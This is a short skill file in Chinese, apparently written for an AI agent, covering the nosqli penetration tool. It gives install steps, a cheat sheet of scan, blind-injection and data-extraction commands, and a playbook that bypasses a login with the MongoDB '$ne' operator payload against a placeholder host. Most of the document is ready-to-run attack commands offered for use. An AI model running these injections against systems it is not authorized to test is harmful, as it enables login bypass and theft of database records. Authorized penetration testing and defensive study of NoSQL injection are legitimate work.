---
name: nosqli-mongo-injection
description: 渗透工具 skill:nosqli 的安装、参数速查与攻击场景 playbook。当任务涉及 Web利用(NoSQL注入) 需要调用 nosqli 时使用。
when-to-use: 渗透工具 skill:nosqli 的安装、参数速查与攻击场景 playbook。当任务涉及 Web利用(NoSQL注入) 需要调用 nosqli 时使用。
---

# nosqli

- 攻击大类:C09 Web利用(NoSQL注入)
- 上游仓库:https://github.com/Charlie-belmer/nosqli
- 上游 License:AgPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/Charlie-belmer/nosqli && cd nosqli && go build -o nosqli
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `./nosqli scan -u 'https://t.com/login'` | MongoDB 注入扫描 |
| `./nosqli scan -t body -p email -u url -d 'email=x&pass=y'` | POST body 参数注入 |
| `inject -u url` | 盲注模式 |
| `extract -u url` | 数据提取 |

## 攻击场景 Playbook

### 登录接口 NoSQL 绕过

```bash
./nosqli scan -u 'https://api.t.com/auth' -t body -p username -d 'username[$ne]=x&password[$ne]=x'
# [$ne] 永真比较绕过登录,工具自动探测
```

## 注意事项

Go 编写,对 JSON/body 中的 Mongo 操作符注入($ne/$gt/$regex)做盲注与数据提取。
